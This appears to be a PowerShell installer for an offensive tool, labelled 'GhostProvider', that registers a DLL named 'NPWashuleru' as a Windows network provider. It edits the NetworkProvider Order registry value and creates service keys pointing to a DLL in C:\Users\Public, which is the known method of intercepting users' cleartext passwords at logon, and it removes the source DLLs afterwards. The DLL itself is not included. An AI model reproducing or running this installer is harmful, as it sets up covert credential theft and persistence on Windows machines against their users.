Write-Host "
 _____ _               _  ______               _     _           
|  __ \ |             | | | ___ \             (_)   | |          
| |  \/ |__   ___  ___| |_| |_/ / __ _____   ___  __| | ___ _ __ 
| | __| '_ \ / _ \/ __| __|  __/ '__/ _ \ \ / / |/ _` |/ _ \ '__|
| |_\ \ | | | (_) \__ \ |_| |  | | | (_) \ V /| | (_| |  __/ |   
 \____/_| |_|\___/|___/\__\_|  |_|  \___/ \_/ |_|\____|\___|_|

                        DLL Network Provider
                        
                                "


$directorioActual = Get-Location

Copy-Item "$directorioActual\*.dll" "<path>"

Remove-Item "$directorioActual\*.dll"

#registro proveedor
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$dllnetprov = "NPWashuleru" #opcional: se puede colocar otro nombre
$UpdatedValue = $Path.PROVIDERORDER + ",$dllnetprov"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue

New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\$dllnetprov
New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\$dllnetprov\NetworkProvider
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$dllnetprov\NetworkProvider -Name "Class" -Value 2
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$dllnetprov\NetworkProvider -Name "Name" -Value $dllnetprov
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$dllnetprov\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "C:\Users\Public\$dllnetprov.dll"
